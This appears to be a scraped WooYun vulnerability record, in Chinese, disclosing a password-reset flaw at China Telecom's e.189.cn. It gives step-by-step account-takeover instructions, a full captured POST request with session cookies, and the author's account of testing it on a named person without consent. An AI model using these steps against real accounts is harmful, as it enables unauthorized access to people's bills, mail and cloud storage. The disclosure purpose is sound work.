{"id": 6555, "wybug_id": "wooyun-2013-045027", "wybug_title": "劫持中国电信天翼用户中心注册用户【实战篇】", "wybug_corp": "中国电信", "wybug_author": "李旭敏", "wybug_date": "2013-12-06 17:14", "wybug_open_date": "2014-01-20 17:15", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "敏感接口未加权限认证", "安全意识不足", "越权操作", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-20：\t细节向公众公开  简要描述： 接上，换了个思路继续推到高富帅。失败乃成功他妈~~~谢谢肉肉的讨论总结，和谢谢小白鼠-啊D``对不起啦 详细说明：  接上，我换了个思路，既然爆破不了，如果服务端没有很好的进行判断，这个属于逻辑错误了吧？想起之前那个新网互联的漏洞么？ WooYun: 新网互联任意域名劫持漏洞可劫持土豆网 结果还真的遇到了一模一样的漏洞。只不过他做了一点加密。首先，先输入对方的号码，找回密码··查看源代码。加密前的手机号是:18934088888加密后的手机号是:DDB18603BE3EC41081405026CCB783DB81E0329F13A88117BE04147D6A30915A\n\n我的号码是XXXXXXXXXXXX加密后后的手机号是XXXXXXXXXXXXXXXXXXXXX42D0\n\n先找回自己的号码，获得验证码8888，然后输入验证码跳转到下一步，修改密码的页面···输入密码wooyun，抓包，点击下一步newPassword=wooyun&userName4Pwd=XXXXXXXXXXXXXXXXXXXXX42D0&confirmPassword=wooyun&modifyPassword=modifyPassword改为newPassword=wooyun&userName4Pwd=DDB18603BE3EC41081405026CCB783DB81E0329F13A88117BE04147D6A30915A&confirmPassword=wooyun&modifyPassword=modifyPassword将自己的加密后手机号改为目标的加密后的手机号，会提示修改成功。\n\n\n\n我们去登陆看看···\n\n登陆成功了，这个危害似乎不大，但是如果去189邮箱或者天翼云网盘看看？\n\n\n\n\n\n可以查看对方账单····可以登陆对方的网盘。幸好天翼的网盘没有广泛使用。不然下一个冠希哥就是你！还可以订购任意套餐，查询通话记录。联系人列表等等···登陆网上营业厅自己慢慢玩···   漏洞证明：  以下是我未经过啊D（彭岸峰）同意做的一个小测试···\n\n可以看到已经弄到他的宽带账号和他的固话了····我已经提醒他改密码了（虽然我可以改回来`(*∩_∩*)）····好像听说189邮箱有代收短信的功能吧？如果是真的话，沦陷的可不只是一个手机号码这么简单以下是简略过程····将之前在burp suit抓到的包保存好··发送到Repeater·····然后修改关键的key，post，继续修改继续post。\n\n\n\n\n\n只要吧POST /getModifyPwd.do HTTP/1.1Host: e.189.cnProxy-Connection: keep-aliveContent-Length: 149Cache-Control: max-age=0Origin: http://e.189.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Referer: http://e.189.cn/getPassword/check.doAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie: citrix_ns_id_.189.cn_%2F_wlf=TlNDX3h1LTIyMi42OC4xODUuMjI5?yag49zJ2NzBf26sVRUcSiIKLM+kA&; svid=ce5bc6c3d74eea76b7b81bf352f439f5; _ga=GA1.2.1527233403.1384162331; JSESSIONID=abcWhDfaPwaGB9YXepalu; dqmhIpCityInfos=%E5%B9%BF%E4%B8%9C%E7%9C%81%E8%8C%82%E5%90%8D%E5%B8%82+%E7%94%B5%E4%BF%A1; SSONUSERNAME=18934081234; cityCode=gd; SESSION_ID=000002684169136-20131205052758739408-024; ACCOUNT=18934081234@189.cn; SSONKEY=5c83c54c969b8514fbbb39f260216e7b365129fcfa046d05dab52ef9533cc86d606a5da6f4318e6e6b5b7b16eba3144052914cfb8c1f0d671b039e2ae78f68490229ed8d772d9ae7204949f7b43c0f96abfd904fde58f4b83115ad7b6d566d0264c17cbca11b73e4833e289c97f2c2b35ec05294981c09aa8fc790dd715c4890fc7955acab92f31d3231a933fb4cf2d67e398d198e45a6fd27ac66c45db25a93d7f246399ecb61ae3eb126aceeeeef7c47de87d8417b0436a6d2e48407a28ee1619394a5228b680c52c44ad0cbb9cb55bc8db21f34026452; VERIFY_LOGON=9f70ec17b2a10d2b4dcbfe3587775c7b; mlmd5=d41d8cd98f00b204e9800998ecf8427e; curlabel=102; s_pers=%20cmpstack%3D%255B%255B%2527cpm-kd-google-unionA%2527%252C%25271382418205284%2527%255D%255D%7C1540184605284%3B%20s_fid%3D2D60081307621C7F-3DFDC40B535F8BD1%7C1449293521564%3B; s_sess=%20s_cc%3Dtrue%3B%20s_sq%3Deship-189-js%253D%252526pid%25253Djs.189.cn%2525252Fbussiness%2525252Fpage%2525252Fnew%2525252Findex.html%252526pidt%25253D1%252526oid%25253Dfunctiononclick%25252528event%25252529%2525257BDialog.getInstance%25252528%252525270%25252527%25252529.cancelButton.onclick.apply%25252528Dialog.getInstance%25252528%252525270%25252527%25252529.ca%252526oidt%25253D2%252526ot%25253DA%3BnewPassword=wooyun&userName4Pwd=02D45EC375ABDB60006581BD3688D454A5E9A0E541B4A2A4362996A8D40030CB&confirmPassword=wooyun&modifyPassword=modifyPassword保存下来，写一个post工具，就可以直接一键秒改密码了···   修复方案：  1.限制找回密码次数，最好在修改密码的时候再添加一次验证。2.判断常用IP登陆地点，在异地找回密码最好提醒一下机主。最后，求赠土豪金一台，助我早日逆袭高富帅T_T送个定制版的iphone4S我也不介意啊···我可是电信的脑残粉   版权声明：转载请注明来源 李旭敏@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-12-10 22:14 厂商回复： CNVD确认所述情况，已经转由CNCERT直接通报给中国电信集团公司，根据中国电信集团公司反馈 ，已经着手修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-05 17:15 |    \t\tHuc-Unis \t\t\t( 普通白帽子  |\t\t\t        Rank:1055 漏洞数:292        | 诶，现在通用奖励越来越低了；离买保时捷卡...)\t\t \n  前排火速留名 mark    \n     2013-12-05 17:19 |    \t\t　 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 　)\t\t \n  二楼已占~    \n     2013-12-05 17:24 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:84        | 三人行必有我师焉########################...)\t\t \n  啊D 都成小白鼠了！    \n     2013-12-05 17:32 |    \t\t龙辰 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | The Dark worId Need To Clean The Blood)\t\t \n  标题刁爆了    \n     2013-12-05 17:35 |    \t\t小土豆 \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:23        )\t\t \n  前排~~ =  =这是什么节奏。。。。    \n     2013-12-05 17:40 |    \t\t花生^_^ \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 加强学习~~)\t\t \n  火速围观~~~~~~~~~    \n     2013-12-05 18:00 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  坐等公布@肉肉电话    \n     2013-12-05 18:02 |    \t\t坠落。 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | -.- 屌丝一枚,菜鸟一个,擅长windows/linux...)\t\t \n  mark    \n     2013-12-05 18:18 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  看到第一篇的时候 就知道第二篇的内容了    \n     2013-12-05 18:20 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  洞主美眉ILOVEYOU    \n     2013-12-05 18:55 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  @Finger @xsser @疯狗 高端大气上档次的标题没了·····明明是可以影响所有电信手机用户的，怎么变成天翼用户中心的注册用户··坑爹···我只不过在漏洞中没有演示其他号码段的而已，况且，电信手机用户的帐号密码是可以在天翼用户中心登陆的，根本不用重新注册···    \n     2013-12-05 19:08 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @李旭敏 经过验证并不能修改所有电信用户的密码，如果有疑问可以联系我。    \n     2013-12-05 22:12 |    \t\t撸王之王撸断肠 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 撸不动了)\t\t \n  mark    \n     2013-12-05 22:24 |    \t\t龙啸双节棍 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 漏洞爱好者)\t\t \n  电信的能获取弱密码    \n     2013-12-05 22:34 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @Finger 审核太给劲了    \n     2013-12-06 06:01 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  - 确定能登录天翼支付？    \n     2013-12-06 08:13 |    \t\t Jesus \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:18        | 天地不仁,以万物为刍狗！)\t\t \n  mark    \n     2013-12-06 15:34 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  马克    \n     2013-12-10 22:59 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  这不是公开了吗！！！？！！还看了啊D的宽带的，怎么又变成确认了！？？乌云最新人性化改进！？@xsser @Finger @疯狗    \n     2013-12-11 03:26 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  @小胖子 你不是一个人.我也看到老    \n     2013-12-11 08:45 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  @小胖子 哪里公开噢···？    \n     2013-12-11 12:45 |    \t\t畅途网(乌云厂商)\t\t \n  哇塞    \n     2013-12-11 13:31 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  @畅途网 目测电信用户··    \n     2013-12-31 09:22 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  居然可以批量改    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}